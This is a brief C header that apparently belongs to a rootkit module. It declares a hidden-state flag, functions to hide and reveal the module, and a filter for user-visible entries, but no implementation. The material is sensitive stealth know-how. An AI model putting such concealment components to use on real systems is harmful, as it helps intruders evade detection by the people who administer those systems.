#ifndef _ROOTI_HIDE_H
#define _ROOTI_HIDE_H

extern bool rooti_hidden;

void rooti_hideme(void);
void rooti_showme(void);

int rooti_filter_user_entry(char *user_buf, size_t count, char *name);

#endif